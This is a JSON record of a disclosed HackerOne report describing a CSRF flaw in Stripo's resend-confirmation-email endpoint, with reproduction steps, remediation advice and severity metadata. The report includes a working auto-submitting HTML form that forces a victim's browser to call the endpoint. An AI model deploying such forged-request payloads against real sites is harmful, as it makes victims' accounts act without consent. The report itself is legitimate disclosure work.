{
  "id": 753386,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NTMzODY=",
  "url": "https://hackerone.com/reports/753386",
  "title": "No CSRF Protection in Resend Confirmation Email feature leads to Sending Unwanted Email in Victim's Inbox without knowing Victim's email address",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-12-06T20:57:52.849Z",
  "submitted_at": "2019-12-06T20:57:52.849Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "whoisbinit",
    "url": "/whoisbinit",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 42368,
    "url": "https://hackerone.com/stripo",
    "handle": "stripo",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Stripo Inc",
      "twitter_handle": "",
      "website": "https://stripo.email",
      "about": "Stripo is a lightweight and intuitive email template editor that lets users build professional looking and highly responsive email templates."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-09-08T11:17:01.487Z",
  "bug_reporter_agreed_on_going_public_at": "2020-08-26T05:34:12.133Z",
  "team_member_agreed_on_going_public_at": "2020-09-08T11:17:01.409Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nThere's no CSRF protection in confirmation email resending feature as a result of which an attacker can trick the victim to receive a confirmation email unknowingly. In other features of the website, the content-type must be \"application/json\", and there is same-origin policy, which prevents CSRF, but in this one, it isn't necessary to have the content-type \"application/json\", as a result of which the \"resendEmailConfirmation\" endpoint becomes vulnerable to CSRF.\n\n## Steps To Reproduce:\nStep 1. Login to your unverified Stripo account, and then intercept the request made while clicking on the \"Resend it\" text at the top-right corner of the webpage. The HTTP Request would look like this:\nRequest URL: https://my.stripo.email/cabinet/stripeapi/v1/resendEmailConfirmation\nRequest Method: POST\nRequest Data: {}\nStep 2. With the obtained information, create a HTML code like this:\n```\n<body onload=\"document.form.submit()\">\n<form name=\"form\" method=\"POST\" action=\"https://my.stripo.email/cabinet/stripeapi/v1/resendEmailConfirmation\">\n</form>\n</body>\n```\nStep 3. Save the file with .html extension, upload it to your website, and send the URL to the victim.\nWhen the victim visits the URL, the request is made automatically from victim's account\n\n### Example URL: https://binitghimire.com.np/stripo/resendEmail.html\n\nThis is how this vulnerability can be reproduced.\n\n## Remediation Actions\nIn accordance with the current situation of the website, the vulnerability can be fixed by making the \"application/json\" content-type compulsory in requests, and optionally passing certain data in the HTTP request so that the reproduction would be impossible, unless the `enctype=\"application/json\"` feature is introduced in higher versions of HTML, and other things would be handled by the existing Same-origin Policy just like in the other features of the website. If the Same-origin Policy hadn't existed, an attacker would have been able to, for example, put any image as someone's profile photo or delete anyone's profile photo, but this doesn't exist, all thanks to the SOP and the content-type \"application/json\" necessity.\n\nAnother way to fix the vulnerability is to introduce the CSRF token system, if you are thinking about bringing a change to the Stripo platform.\n\n## Supporting Material/References:\n  * An image has been attached along with this vulnerability report.\n\n## Impact\n\nAs a result of this vulnerability, an attacker would be able to lead the victim in receiving confirmation email without even knowing and without clicking any buttons or filling up any details.\n\nI would be looking forward to hearing from you soon.\n\nThanks,\n@binit",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 652858,
      "file_name": "Result_of_CSRF.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jYbWpRXL22UuLRiWeNCH33HK?response-content-disposition=attachment%3B%20filename%3D%22Result_of_CSRF.png%22%3B%20filename%2A%3DUTF-8%27%27Result_of_CSRF.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133301Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b928e9feb21a6f163556009d545d00febf7354fba06337e9921263502de33dff",
      "file_size": 24780,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 10,
  "voters": [
    "bibekshah",
    "akashhamal0x01",
    "dhakal_bibek",
    "styrene",
    "sa1tama0",
    "zaher1911",
    "linusiar",
    "be9f2e097822923531f6582",
    "aliasnotallowed",
    "n00813"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "low",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 38702,
    "asset_type": "URL",
    "asset_identifier": "my.stripo.email",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 24340,
      "category": "researcher",
      "content": "There was no CSRF protection in the feature used for resending confirmation email in **Stripo**, due to which an attacker could trick the victim to receive an account confirmation email unknowingly.",
      "user": {
        "id": 204685,
        "username": "whoisbinit",
        "name": "Binit Ghimire",
        "bio": "I am a Tech Enthusiastic full-stack web developer, programmer and web/network penetration tester from Nepal.",
        "cleared": false,
        "verified": false,
        "website": "https://WHOISbinit.me/",
        "location": "Bharatpur-9, Milanchowk, Chitwan",
        "created_at": "2017-10-02T06:42:57.263Z",
        "url": "https://hackerone.com/whoisbinit",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
